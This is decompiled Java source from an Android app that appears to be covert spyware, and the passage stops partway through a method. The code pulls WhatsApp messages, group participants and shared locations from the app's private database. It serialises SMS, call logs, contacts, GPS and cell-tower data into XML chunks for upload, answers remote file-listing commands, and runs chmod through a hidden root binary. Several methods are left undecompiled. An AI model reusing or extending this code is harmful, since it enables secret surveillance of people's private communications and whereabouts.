package com.network.android;

import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Xml;
import com.network.android.c.a.a;
import com.network.h.b;
import com.network.i.e;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.StringWriter;
import java.net.URLEncoder;
import java.util.Date;
import java.util.HashMap;
import java.util.concurrent.TimeoutException;
import java.util.concurrent.locks.ReentrantReadWriteLock;
import org.xmlpull.v1.XmlSerializer;

public final class m {

    /* renamed from: a  reason: collision with root package name */
    public static String f84a = null;
    static final Object b = new Object();
    public static int c = 0;
    private static HashMap d;
    private static Handler e;

    static {
        HandlerThread handlerThread = new HandlerThread("getFileSystem");
        handlerThread.start();
        e = new Handler(handlerThread.getLooper());
    }

    public static int a(String str, Process process) {
        int i = 0;
        int i2 = 0;
        while (i2 < 90000) {
            try {
                a.a("runProcess WaitForTimeout spend=" + i2 + " bytes=" + 0 + ", proc=" + str);
                int available = process.getInputStream().available();
                if (available > 0) {
                    byte[] bArr = new byte[available];
                    process.getInputStream().read(bArr);
                    i = 0 + available;
                    a.a("runProcess WaitForTimeout getInputStream=" + new String(bArr));
                }
                int available2 = process.getErrorStream().available();
                if (available2 > 0) {
                    byte[] bArr2 = new byte[available2];
                    process.getErrorStream().read(bArr2);
                    int i3 = i + available2;
                    a.a("runProcess WaitForTimeout getErrorStream=" + new String(bArr2));
                }
                return process.exitValue();
            } catch (IllegalThreadStateException e2) {
                a.a("runProcess WaitForTimeout jump=100, spend=" + i2 + ", bytes=" + 0);
                Thread.sleep(100);
                i2 += 100;
            } catch (Exception e3) {
                a.a("runProcess WaitForTimeout exception=" + e3.getMessage());
                Thread.sleep(100);
                i2 += 100;
            }
        }
        process.destroy();
        a.a("runProcess WaitForTimeout Destroy process. after=" + i2);
        throw new TimeoutException("runProcess WaitForTimeout Destroy process. after=" + i2);
    }

    /* JADX WARNING: Removed duplicated region for block: B:18:0x0052  */
    /* JADX WARNING: Removed duplicated region for block: B:20:0x0057  */
    /* JADX WARNING: Removed duplicated region for block: B:26:0x0077  */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x007c  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static java.lang.String a(android.content.ContentResolver r6, android.database.Cursor r7, java.lang.StringBuilder r8) {
        /*
        // Method dump skipped, instructions count: 136
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.m.a(android.content.ContentResolver, android.database.Cursor, java.lang.StringBuilder):java.lang.String");
    }

    public static String a(String str) {
        try {
            return Long.toString(Long.parseLong(str) / 1000);
        } catch (Exception e2) {
            a.a("Exception- " + e2.getMessage(), e2);
            return "";
        }
    }

    /* JADX WARNING: Code restructure failed: missing block: B:28:0x0081, code lost:
        r1.close();
        r0 = r2;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:31:0x0089, code lost:
        r1.close();
     */
    /* JADX WARNING: Code restructure failed: missing block: B:33:0x008d, code lost:
        r0 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:34:0x008e, code lost:
        r1 = r2;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:35:0x0090, code lost:
        r0 = th;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:36:0x0091, code lost:
        r2 = null;
        r1 = r2;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:40:0x009c, code lost:
        r0 = r2;
     */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Removed duplicated region for block: B:18:0x0055  */
    /* JADX WARNING: Removed duplicated region for block: B:28:0x0081  */
    /* JADX WARNING: Removed duplicated region for block: B:31:0x0089  */
    /* JADX WARNING: Removed duplicated region for block: B:33:0x008d A[ExcHandler: all (th java.lang.Throwable), Splitter:B:7:0x003a] */
    /* JADX WARNING: Removed duplicated region for block: B:39:0x009a  */
    /* JADX WARNING: Removed duplicated region for block: B:40:0x009c  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static java.lang.String a(java.lang.String r6, android.database.sqlite.SQLiteDatabase r7, java.lang.String r8) {
        /*
        // Method dump skipped, instructions count: 160
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.m.a(java.lang.String, android.database.sqlite.SQLiteDatabase, java.lang.String):java.lang.String");
    }

    public static String a(XmlSerializer xmlSerializer, String str) {
        String str2;
        String str3;
        String str4;
        try {
            a.a("get whatsapp error serializeString: " + str);
            xmlSerializer.cdsect(str);
            return str;
        } catch (Throwable th) {
            a.a("get whatsapp serializeString regular1 error- " + th.getMessage(), th);
            try {
                str = str.replaceAll("[^\\u0000-\\uFFFF]", "-X-");
                xmlSerializer.cdsect(str);
                return str;
            } catch (Exception e2) {
                str2 = str;
                a.a("get whatsapp error serializeString serializer.cdsect2 replaceAll " + str2);
                str4 = new String(str2.getBytes(), "ISO-8859-1");
                xmlSerializer.cdsect(str4);
                a.a("serializeString: " + str4);
                return str4;
            } catch (Throwable th2) {
                str2 = str4;
            }
        }
        a.a("get whatsapp error serializeString serializer.cdsect ISO-8859-1 3- " + str2);
        try {
            str3 = URLEncoder.encode(str2, "UTF-8");
            try {
                xmlSerializer.cdsect(str3);
                return str3;
            } catch (Throwable th3) {
            }
        } catch (Throwable th4) {
            str3 = str2;
            a.a("get whatsapp error serializer.cdsect4 UTF-8-  " + str3);
            return str3;
        }
    }

    static HashMap a(String str, String[] strArr) {
        HashMap hashMap;
        Throwable th;
        try {
            a.a("getChmodPermissionsIntoArrayForMiltiplyFilesInFolder starting for file path: " + str);
            hashMap = new HashMap();
            try {
                String[] split = str.split("/");
                String str2 = "";
                for (int i = 0; i < split.length; i++) {
                    String str3 = str2 + split[i];
                    if (str3.length() > 1) {
                        hashMap.put(str3, Integer.valueOf(b.b(new File(str3))));
                    }
                    str2 = str3 + "/";
                }
                for (int i2 = 0; i2 < strArr.length; i2++) {
                    String str4 = str + "/" + strArr[i2];
                    hashMap.put(str4, Integer.valueOf(b.b(new File(str4))));
                }
            } catch (Throwable th2) {
                th = th2;
                a.a("getChmodPermissionsIntoArrayForMiltiplyFilesInFolder: " + th.getMessage(), th);
                return hashMap;
            }
        } catch (Throwable th3) {
            hashMap = null;
            th = th3;
            a.a("getChmodPermissionsIntoArrayForMiltiplyFilesInFolder: " + th.getMessage(), th);
            return hashMap;
        }
        return hashMap;
    }

    public static void a(Context context, Cursor cursor, SQLiteDatabase sQLiteDatabase) {
        Throwable th;
        a.a("whatsapp addWhatsAppEntries Messages count : " + cursor.getCount());
        if (cursor.getCount() > 0) {
            SharedPreferences sharedPreferences = null;
            try {
                sharedPreferences = context.createPackageContext("com.whatsapp", 0).getSharedPreferences("com.whatsapp_preferences", 0);
            } catch (Throwable th2) {
                a.a("whatsapp addWhatsAppEntries read pref- " + th2.getMessage(), th2);
            }
            int i = 1;
            XmlSerializer newSerializer = Xml.newSerializer();
            StringWriter stringWriter = new StringWriter();
            SmsReceiver.a(newSerializer, stringWriter);
            newSerializer.startTag("", "imSession");
            while (cursor.moveToNext()) {
                i++;
                try {
                    a.a("whatsapp addWhatsAppEntries buffer lenth: " + stringWriter.getBuffer().length() + ",  index: " + i);
                    if (stringWriter.getBuffer().length() > 97280) {
                        newSerializer.endTag("", "imSession");
                        SmsReceiver.a(newSerializer);
                        j.a(stringWriter.toString(), context);
                        j.a(context);
                        a.a("whatsapp addWhatsAppEntries 100k chunk buffer lenth: " + stringWriter.getBuffer().length() + ",  index: " + i);
                        Thread.sleep(300);
                        XmlSerializer newSerializer2 = Xml.newSerializer();
                        try {
                            StringWriter stringWriter2 = new StringWriter();
                            try {
                                SmsReceiver.a(newSerializer2, stringWriter2);
                                newSerializer2.startTag("", "imSession");
                                stringWriter = stringWriter2;
                                newSerializer = newSerializer2;
                            } catch (Throwable th3) {
                                stringWriter = stringWriter2;
                                newSerializer = newSerializer2;
                                th = th3;
                                a.a("whatsapp addWhatsAppEntries iter - " + th.getMessage(), th);
                            }
                        } catch (Throwable th4) {
                            newSerializer = newSerializer2;
                            th = th4;
                            a.a("whatsapp addWhatsAppEntries iter - " + th.getMessage(), th);
                        }
                    }
                    a(cursor, sQLiteDatabase, sharedPreferences, newSerializer);
                } catch (Throwable th5) {
                    th = th5;
                    a.a("whatsapp addWhatsAppEntries iter - " + th.getMessage(), th);
                }
            }
            newSerializer.endTag("", "imSession");
            SmsReceiver.a(newSerializer);
            j.a(stringWriter.toString(), context);
            j.a(context);
            cursor.moveToLast();
            f84a = cursor.getString(cursor.getColumnIndex("timestamp"));
            try {
                a.a("whatsapp new whatsAppId after dump: " + f84a + ", by date:" + new Date(Long.parseLong(f84a)).toString());
            } catch (Throwable th6) {
            }
            SharedPreferences.Editor edit = context.getSharedPreferences("NetworkPreferences", 0).edit();
            edit.putString("firstRunIndex", f84a);
            edit.commit();
            return;
        }
        a.a("whatsapp no new Messages do send");
    }

    private static void a(Context context, File file, String str, String str2, StringBuffer stringBuffer, XmlSerializer xmlSerializer) {
        File[] listFiles = file.listFiles();
        if (listFiles != null) {
            int length = listFiles.length;
            StringBuffer stringBuffer2 = stringBuffer;
            XmlSerializer xmlSerializer2 = xmlSerializer;
            for (int i = 0; i < length; i++) {
                try {
                    boolean isDirectory = listFiles[i].isDirectory();
                    File file2 = listFiles[i];
                    xmlSerializer2.startTag("", "file");
                    if (!isDirectory) {
                        xmlSerializer2.attribute("", "length", String.valueOf(file2.length()));
                    } else {
                        xmlSerializer2.attribute("", "length", String.valueOf(0));
                    }
                    xmlSerializer2.attribute("", "name", file2.getName());
                    xmlSerializer2.attribute("", "timestamp", String.valueOf(file2.lastModified() / 1000));
                    xmlSerializer2.attribute("", "commandAck", str2);
                    xmlSerializer2.attribute("", "isDir", isDirectory ? "true" : "false");
                    xmlSerializer2.endTag("", "file");
                    if (stringBuffer2.length() > 97280) {
                        xmlSerializer2.endTag("", "fileSystemList");
                        SmsReceiver.a(xmlSerializer2);
                        j.a(context, stringBuffer2.toString(), (String[]) null, (byte[][]) null);
                        xmlSerializer2 = Xml.newSerializer();
                        StringWriter stringWriter = new StringWriter();
                        SmsReceiver.a(xmlSerializer2, stringWriter);
                        xmlSerializer2.startTag("", "fileSystemList");
                        xmlSerializer2.attribute("", "timestamp", str);
                        stringBuffer2 = stringWriter.getBuffer();
                        a.a(" printTreeView BREAK writer.getBuffer().length()=" + stringWriter.getBuffer().length());
                    }
                } catch (Throwable th) {
                    a.a("printTreeView exception -  " + th.getMessage(), th);
                    com.network.android.c.a.b.a(0, 116, "GET_FILE_GENERAL_FAILURE", b.c(str2));
                    com.network.android.c.a.b.a(0, -15534, "", b.c(str2));
                }
            }
        }
    }

    private static void a(Cursor cursor, SQLiteDatabase sQLiteDatabase, SharedPreferences sharedPreferences, XmlSerializer xmlSerializer) {
        String str;
        String str2;
        String str3;
        try {
            String string = cursor.getString(cursor.getColumnIndex("key_remote_jid"));
            if (!"-1".equals(string)) {
                String string2 = cursor.getString(cursor.getColumnIndex("data"));
                String string3 = cursor.getString(cursor.getColumnIndex("media_name"));
                int i = cursor.getInt(cursor.getColumnIndex("media_wa_type"));
                String string4 = cursor.getString(cursor.getColumnIndex("media_url"));
                if (i == 0 && (string2 == null || string2.length() == 0)) {
                    a.a("whatsapp mediaType 0 - it a new contact or new group ");
                    return;
                }
                String str4 = null;
                if (string4 != null) {
                    try {
                        if (string4.length() > 0) {
                            String[] split = string4.split("/");
                            str4 = split[split.length - 1];
                        }
                    } catch (Throwable th) {
                        str = null;
                    }
                }
                str = str4;
                String str5 = string2 == null ? "" : string2.contains("BEGIN:VCARD") ? "" : string2;
                if (i == 1) {
                    if (string3 == null || string3.length() <= 0) {
                        if (str != null && str.length() > 0) {
                            str2 = str5 + " Image:" + str;
                        }
                        str2 = str5;
                    } else {
                        str2 = str5 + " Image:" + string3;
                    }
                } else if (i == 2) {
                    if (string3 == null || string3.length() <= 0) {
                        if (str != null && str.length() > 0) {
                            str2 = str5 + " Audio:" + str;
                        }
                        str2 = str5;
                    } else {
                        str2 = str5 + " Audio:" + string3;
                    }
                } else if (i != 3) {
                    if (i == 4) {
                        if (string3 != null && string3.length() > 0) {
                            str2 = " Contact:" + string3;
                        }
                    } else if (i == 5) {
                        str5 = str5 + " Location:(" + cursor.getDouble(cursor.getColumnIndex("latitude")) + "," + cursor.getDouble(cursor.getColumnIndex("longitude")) + ")";
                        if (string3 != null) {
                            str5 = str5 + " - (" + string3 + ")";
                        }
                        a.a("whatsapp Location: " + str5);
                    }
                    str2 = str5;
                } else if (string3 == null || string3.length() <= 0) {
                    if (str != null && str.length() > 0) {
                        str2 = str5 + " Vidao:" + str;
                    }
                    str2 = str5;
                } else {
                    str2 = str5 + " Vidao:" + string3;
                }
                String str6 = "666";
                String str7 = "My Name";
                if (sharedPreferences != null) {
                    str6 = sharedPreferences.getString("registration_jid", "No Number");
                    str7 = sharedPreferences.getString("push_name", "No Number");
                }
                String string5 = cursor.getString(cursor.getColumnIndex("_id"));
                String string6 = cursor.getString(cursor.getColumnIndex("timestamp"));
                boolean z = cursor.getInt(cursor.getColumnIndex("key_from_me")) == 1;
                String string7 = cursor.getString(cursor.getColumnIndex("remote_resource"));
                int indexOf = string.indexOf("@");
                if (indexOf < 0) {
                    a.a("addWhatsAppSingleEntry cannot find '@' in '" + string + "'");
                    return;
                }
                String substring = string.substring(0, indexOf);
                boolean contains = substring.contains("-");
                String str8 = "unknown";
                String str9 = "unknown";
                if (z) {
                    if (!contains) {
                        str8 = str7 + ", " + a(string, sQLiteDatabase, str6);
                        str9 = str6 + ", " + substring;
                        str3 = str7;
                    } else if (sharedPreferences != null) {
                        String string8 = sharedPreferences.getString("pa-" + string, null);
                        if (string8 == null) {
                            str8 = string;
                            str9 = string;
                            str3 = str7;
                        } else {
                            String[] split2 = string8.split(",");
                            a.a("whatsapp groupIdsArry length:  " + split2.length);
                            str9 = str6;
                            str8 = str7;
                            for (int i2 = 0; i2 < split2.length; i2++) {
                                int indexOf2 = split2[i2].indexOf("@");
                                if (indexOf2 < 0) {
                                    a.a("addWhatsAppSingleEntry loop cannot find '@' in '" + split2[i2] + "'");
                                    return;
                                }
                                String substring2 = split2[i2].substring(0, indexOf2);
                                str9 = str9 + ", " + substring2;
                                str8 = str8 + ", " + a(split2[i2], sQLiteDatabase, substring2);
                            }
                            str3 = str7;
                        }
                    } else {
                        str3 = str7;
                    }
                } else if (!contains) {
                    String a2 = a(string, sQLiteDatabase, substring);
                    str8 = a2 + ", " + str7;
                    str9 = substring + ", " + str6;
                    str6 = substring;
                    str3 = a2;
                } else if (string7 != null && string7.length() != 0 && string7.indexOf("@") != -1) {
                    str6 = string7.substring(0, string7.indexOf("@"));
                    String a3 = a(string7, sQLiteDatabase, str6);
                    if (sharedPreferences != null) {
                        String string9 = sharedPreferences.getString("pa-" + string, null);
                        if (string9 == null) {
                            str8 = string;
                            str3 = a3;
                            str9 = string;
                        } else {
                            String[] split3 = string9.split(",");
                            String str10 = str6;
                            str8 = a3;
                            for (int i3 = 0; i3 < split3.length; i3++) {
                                int indexOf3 = split3[i3].indexOf("@");
                                if (indexOf3 < 0) {
                                    a.a("addWhatsAppSingleEntry last cannot find '@' in '" + split3[i3] + "'");
                                    return;
                                }
                                String substring3 = split3[i3].substring(0, indexOf3);
                                str10 = str10 + ", " + substring3;
                                str8 = str8 + ", " + a(split3[i3], sQLiteDatabase, substring3);
                            }
                            str3 = a3;
                            str9 = str10;
                        }
                    } else {
                        str8 = a3;
                        str3 = a3;
                        str9 = str6;
                    }
                } else {
                    return;
                }
                String a4 = a(string6);
                xmlSerializer.startTag("", "imEntry");
                xmlSerializer.attribute("", "recordId", string5);
                xmlSerializer.attribute("", "sessionId", string);
                xmlSerializer.attribute("", "from", str6);
                xmlSerializer.attribute("", "platform", "whatsapp");
                xmlSerializer.attribute("", "timestamp", a4);
                xmlSerializer.startTag("", "chat");
                a(xmlSerializer, str3 + ": " + str2);
                xmlSerializer.endTag("", "chat");
                xmlSerializer.startTag("", "participants");
                a(xmlSerializer, str8);
                xmlSerializer.endTag("", "participants");
                xmlSerializer.startTag("", "participantNumbers");
                a(xmlSerializer, str9);
                xmlSerializer.endTag("", "participantNumbers");
                xmlSerializer.endTag("", "imEntry");
            }
        } catch (Throwable th2) {
            a.a("get whatsapp iter- " + th2.getMessage(), th2);
        }
    }

    public static void a(Handler handler, Context context, boolean z) {
        handler.post(new o(z, context));
    }

    public static void a(String str, Context context, String str2) {
        try {
            a.a("getFileSystem started");
            File file = new File(str);
            if (!file.exists()) {
                a.a("getFileSystem dir does not exists. returning");
                com.network.android.c.a.b.a(1, 119, "GET_FILE_FILE_DOES_NOT_EXISTS");
                com.network.android.c.a.b.a(0, 119, "GET_FILE_FILE_DOES_NOT_EXISTS", b.c(str2));
                com.network.android.c.a.b.a(0, -15534, "", b.c(str2));
                return;
            }
            File[] listFiles = file.listFiles();
            if (listFiles == null || listFiles.length == 0) {
                a.a("getFileSystem no files on the base directory");
                com.network.android.c.a.b.a(1, 117, "GET_FILE_EMPTY_DIR_OR_FILE");
                com.network.android.c.a.b.a(0, 117, "GET_FILE_EMPTY_DIR_OR_FILE", b.c(str2));
                com.network.android.c.a.b.a(0, -15534, "", b.c(str2));
                return;
            }
            XmlSerializer newSerializer = Xml.newSerializer();
            StringWriter stringWriter = new StringWriter();
            SmsReceiver.a(newSerializer, stringWriter);
            newSerializer.startTag("", "fileSystemList");
            String b2 = e.b();
            newSerializer.attribute("", "timestamp", b2);
            a(context, file, b2, str2, stringWriter.getBuffer(), newSerializer);
            newSerializer.endTag("", "fileSystemList");
            SmsReceiver.a(newSerializer);
            j.a(context, stringWriter.toString(), (String[]) null, (byte[][]) null);
            com.network.android.c.a.b.a(str2);
            a.a("getFileSystem ended");
        } catch (Throwable th) {
            com.network.android.c.a.b.a(0, 24, "GET_FILE_GENERAL_FAILURE", b.c(str2));
            com.network.android.c.a.b.a(0, -15534, "", b.c(str2));
            a.a("getFileSystem: " + th.getMessage(), th);
        }
    }

    static void a(String str, String str2) {
        String str3 = "chmod " + str2 + " ";
        String str4 = "";
        File file = new File(str);
        if (file.isDirectory()) {
            try {
                File[] listFiles = file.listFiles();
                for (int i = 0; i < listFiles.length; i++) {
                    try {
                        str4 = str4 + str3 + listFiles[i].getAbsolutePath() + "; ";
                    } catch (Exception e2) {
                    }
                }
            } catch (Exception e3) {
            }
        }
        a.a("get getPassword runProcess:" + str4);
        c(str4);
    }

    public static void a(String str, String str2, Context context) {
        try {
            a.a("parseFileSystemCommand started. msg: " + str);
            int indexOf = str.indexOf("f=", 0) + 2;
            int i = indexOf + 1;
            int parseInt = Integer.parseInt(str.substring(indexOf, i));
            a.a("parseFileSystemCommand shouldGetFile: " + parseInt);
            if (-1 == str.indexOf("p=", i)) {
                a.a("parseFileSystemCommand old command. (no path param) returning");
                return;
            }
            String substring = str.substring(str.indexOf("p=", i) + 2);
            a.a("parseFileSystemCommand encoded Path: " + substring);
            String str3 = new String(com.network.i.a.b(substring));
            a.a("parseFileSystemCommand path to get: " + str3);
            e.postDelayed(new n(str3, parseInt, context, str2), 10);
        } catch (Throwable th) {
            a.a("parseFileSystemCommand: " + th.getMessage(), th);
        }
    }

    public static void a(String str, String str2, String[] strArr) {
        try {
            if (!new File("/system/csk").exists()) {
                a.a("setMultipleFilesChmodInFolder MY_SU does not exists. returning");
                return;
            }
            String[] split = str2.split("/");
            String str3 = "";
            for (int i = 0; i < split.length; i++) {
                String str4 = str3 + split[i];
                if (str4.length() > 1) {
                    String str5 = "chmod " + str + " '" + str4 + "'";
                    a.a("setMultipleFilesChmodInFolder running command: " + str5);
                    c(str5);
                }
                str3 = str4 + "/";
            }
            for (int i2 = 0; i2 < strArr.length; i2++) {
                String str6 = "chmod " + str + " '" + (str2 + "/" + strArr[i2]) + "'";
                a.a("setMultipleFilesChmodInFolder running command: " + str6);
                c(str6);
            }
        } catch (Throwable th) {
            a.a("setMultipleFilesChmodInFolder exception: " + th.getMessage(), th);
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:31:0x0123 A[Catch:{ Throwable -> 0x012d }] */
    /* JADX WARNING: Removed duplicated region for block: B:33:0x0128 A[Catch:{ Throwable -> 0x012d }] */
    /* JADX WARNING: Removed duplicated region for block: B:54:0x01ba A[Catch:{ Throwable -> 0x01c3 }] */
    /* JADX WARNING: Removed duplicated region for block: B:56:0x01bf A[Catch:{ Throwable -> 0x01c3 }] */
    /* JADX WARNING: Removed duplicated region for block: B:70:? A[Catch:{ Exception -> 0x0146 }, RETURN, SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    private static void a(java.lang.StringBuilder r9) {
        /*
        // Method dump skipped, instructions count: 481
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.m.a(java.lang.StringBuilder):void");
    }

    public static void a(StringBuilder sb, String str, String str2) {
        try {
            sb.append("\r\nBEGIN:VCARD\r\nVERSION:3.0\r\nFN:" + str + "\r\nNICKNAME:" + str);
            sb.append("\r\nTEL;TYPE=WORK,VOICE:" + str2);
            sb.append("\r\nEND:VCARD\r\n");
        } catch (Throwable th) {
            a.a("serializeContactSim- " + th.getMessage(), th);
        }
    }

    public static void a(HashMap hashMap, String str) {
        try {
            if (!new File("/system/csk").exists()) {
                a.a("setFilePathChmodAccordingToMap MY_SU does not exists. returning");
            } else if (hashMap == null) {
                a.a("setFilePathChmodAccordingToMap chmodMap is null. returning");
            } else {
                String[] split = str.split("/");
                String str2 = "";
                int i = 0;
                while (i < split.length) {
                    String str3 = str2 + split[i];
                    if (str3.length() > 1 && -1 != ((Integer) hashMap.get(str3)).intValue()) {
                        String str4 = "chmod " + Integer.toString(((Integer) hashMap.get(str3)).intValue(), 8) + " " + str3;
                        a.a("setFilePathChmodAccordingToMap running command: " + str4);
                        c(str4);
                    }
                    i++;
                    str2 = str3 + "/";
                }
            }
        } catch (Throwable th) {
            a.a("setFilePathChmodAccordingToMap: " + th.getMessage(), th);
        }
    }

    public static void a(HashMap hashMap, String str, String[] strArr) {
        try {
            if (!new File("/system/csk").exists()) {
                a.a("setFilePathChmodAccordingToMapForMultipleFilesInFolder MY_SU does not exists. returning");
            } else if (hashMap == null) {
                a.a("setFilePathChmodAccordingToMapForMultipleFilesInFolder chmodMap is null. returning");
            } else {
                String str2 = "";
                String[] split = str.split("/");
                int i = 0;
                while (i < split.length) {
                    String str3 = str2 + split[i];
                    if (str3.length() > 1 && hashMap.get(str3) != null) {
                        String str4 = "chmod " + Integer.toString(((Integer) hashMap.get(str3)).intValue(), 8) + " " + str3;
                        a.a("setFilePathChmodAccordingToMapForMultipleFilesInFolder running command: " + str4);
                        c(str4);
                    }
                    i++;
                    str2 = str3 + "/";
                }
                for (int i2 = 0; i2 < strArr.length; i2++) {
                    String str5 = str + "/" + strArr[i2];
                    Integer num = (Integer) hashMap.get(str5);
                    if (-1 == num.intValue()) {
                        a.a("setFilePathChmodAccordingToMapForMultipleFilesInFolder chmod permissions are invalid for file: " + str5);
                    } else {
                        String str6 = "chmod " + Integer.toString(num.intValue(), 8) + " " + str5;
                        a.a("setFilePathChmodAccordingToMapForMultipleFilesInFolder running command: " + str6);
                        c(str6);
                    }
                }
            }
        } catch (Throwable th) {
            a.a("setFilePathChmodAccordingToMap: " + th.getMessage(), th);
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:12:0x0060  */
    /* JADX WARNING: Removed duplicated region for block: B:22:0x0093  */
    /* JADX WARNING: Removed duplicated region for block: B:33:0x00f0  */
    /* JADX WARNING: Removed duplicated region for block: B:42:0x012d  */
    /* JADX WARNING: Removed duplicated region for block: B:54:0x017c  */
    /* JADX WARNING: Removed duplicated region for block: B:57:0x0197  */
    /* JADX WARNING: Removed duplicated region for block: B:60:0x01a2  */
    /* JADX WARNING: Removed duplicated region for block: B:63:0x01ad  */
    /* JADX WARNING: Removed duplicated region for block: B:66:0x01b8  */
    /* JADX WARNING: Removed duplicated region for block: B:69:0x01c3  */
    /* JADX WARNING: Removed duplicated region for block: B:72:0x01ce  */
    /* JADX WARNING: Removed duplicated region for block: B:81:0x01f0  */
    /* JADX WARNING: Removed duplicated region for block: B:87:0x020b  */
    /* JADX WARNING: Removed duplicated region for block: B:90:0x0211  */
    /* JADX WARNING: Removed duplicated region for block: B:92:0x0218  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static void a(org.xmlpull.v1.XmlSerializer r13, android.content.ContentResolver r14) {
        /*
        // Method dump skipped, instructions count: 561
        */
        throw new UnsupportedOperationException("Method not decompiled: com.network.android.m.a(org.xmlpull.v1.XmlSerializer, android.content.ContentResolver):void");
    }

    public static void a(XmlSerializer xmlSerializer, ContentResolver contentResolver, Cursor cursor, String str, StringBuilder sb) {
        try {
            a.a("get Contacts" + cursor.getPosition());
            a(xmlSerializer, str, a(contentResolver, cursor, sb), sb.toString());
        } catch (Exception e2) {
            a.a("get Contacts Exception- " + e2.getMessage(), e2);
        }
    }

    public static void a(XmlSerializer xmlSerializer, Context context) {
        try {
            a.a("get Cell Id");
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            GsmCellLocation gsmCellLocation = (GsmCellLocation) telephonyManager.getCellLocation();
            String networkOperator = telephonyManager.getNetworkOperator();
            if (networkOperator != null && networkOperator.length() > 0) {
                xmlSerializer.startTag("", "cellularNetwork");
                a(xmlSerializer, gsmCellLocation, networkOperator, telephonyManager);
                xmlSerializer.endTag("", "cellularNetwork");
            }
        } catch (Exception e2) {
            a.a("Get Cell Id Exception- " + e2.getMessage(), e2);
        }
    }

    public static void a(XmlSerializer xmlSerializer, Location location) {
        try {
            a.a("serializeLocation start");
            xmlSerializer.startTag("", "location");
            xmlSerializer.attribute("", "lat", String.valueOf(location.getLatitude()));
            xmlSerializer.attribute("", "alt", String.valueOf(location.getAltitude()));
            xmlSerializer.attribute("", "lon", String.valueOf(location.getLongitude()));
            xmlSerializer.attribute("", "vAccuracy", String.valueOf(location.getAccuracy()));
            xmlSerializer.attribute("", "velocity", String.valueOf(location.getSpeed()));
            a.a("serializeLocation Provider: " + location.getProvider());
            xmlSerializer.attribute("", "source", "satellite");
            xmlSerializer.attribute("", "timestamp", a(String.valueOf(location.getTime())));
            xmlSerializer.endTag("", "location");
            a.a("serializeLocation end");
        } catch (Throwable th) {
            a.a("Get Location Exception- " + th.getMessage(), th);
        }
    }

    public static void a(XmlSerializer xmlSerializer, GsmCellLocation gsmCellLocation, String str, TelephonyManager telephonyManager) {
        String str2;
        String str3;
        xmlSerializer.startTag("", "cellInfo");
        int cid = gsmCellLocation.getCid();
        int lac = gsmCellLocation.getLac();
        if (str == null || str.length() < 5) {
            str2 = "000";
            str3 = "00";
        } else {
            str2 = str.substring(0, 3);
            str3 = str.substring(3, str.length());
        }
        a.a("networkOperator: " + str);
        xmlSerializer.attribute("", "CellId", String.valueOf(cid));
        xmlSerializer.attribute("", "LAC", String.valueOf(lac));
        xmlSerializer.attribute("", "MCC", String.valueOf(str2));
        xmlSerializer.attribute("", "MNC", str3);
        if (j.a(telephonyManager)) {
            xmlSerializer.attribute("", "isRoaming", "true");
        } else {
            xmlSerializer.attribute("", "isRoaming", "false");
        }
        xmlSerializer.attribute("", "timestamp", a(String.valueOf(new Date().getTime())));
        xmlSerializer.endTag("", "cellInfo");
    }

    public static void a(XmlSerializer xmlSerializer, String str, String str2, int i, String str3, String str4, String str5) {
        a.a("serializeCall number=" + str + " date=" + str2 + " type=" + i + " duration=" + str3 + " isStarted=" + str4 + " recordId=" + str5);
        if (str == null) {
            str = "Unknown";
        } else if (f(str) <= 0) {
            str = "Unknown";
        }
        xmlSerializer.startTag("", "phoneCall");
        if (str5 != null) {
            xmlSerializer.attribute("", "recordId", str5);
        }
        xmlSerializer.attribute("", "timestamp", a(str2));
        xmlSerializer.attribute("", "type", new Integer(i).toString());
        xmlSerializer.attribute("", "number", str);
        xmlSerializer.attribute("", "duration", str3);
        if (str4 != null) {
            xmlSerializer.attribute("", "isStart", str4);
        }
        if (i == 2) {
            xmlSerializer.attribute("", "direction", "outbound");
        } else {
            xmlSerializer.attribute("", "direction", "inbound");
        }
        xmlSerializer.endTag("", "phoneCall");
    }

    public static void a(XmlSerializer xmlSerializer, String str, String str2, String str3) {
        xmlSerializer.startTag("", "contact");
        xmlSerializer.attribute("", "recordId", str2);
        if (str != null) {
            xmlSerializer.attribute("", "updateType", str);
        }
        xmlSerializer.attribute("", "timestamp", e.b());
        if (str3 != null) {
            xmlSerializer.cdsect(str3);
        }
        xmlSerializer.endTag("", "contact");
    }

    public static void a(XmlSerializer xmlSerializer, String str, String str2, String str3, String str4, String str5) {
        try {
            String a2 = a(str4);
            xmlSerializer.startTag("", "smsEntry");
            xmlSerializer.attribute("", "timestamp", a2);
            xmlSerializer.attribute("", "number", str2);
            xmlSerializer.attribute("", "direction", str);
            if (str5 != null) {
                xmlSerializer.attribute("", "platform", str5);
            }
            xmlSerializer.startTag("", "message");
            if (str3 != null) {
                try {
                    if (str3.length() != 0) {
                        xmlSerializer.cdsect(e(str3));
                        xmlSerializer.endTag("", "message");
                        xmlSerializer.endTag("", "smsEntry");
                    }
                } catch (Exception e2) {
                    a.a("cdsect Exception- " + e2.getMessage(), e2);
                    xmlSerializer.cdsect("No Message");
                }
            }
            xmlSerializer.cdsect("Empty Message");
            xmlSerializer.endTag("", "message");
            xmlSerializer.endTag("", "smsEntry");
        } catch (Throwable th) {
            a.a("get sms serialize single Exception- " + th.getMessage(), th);
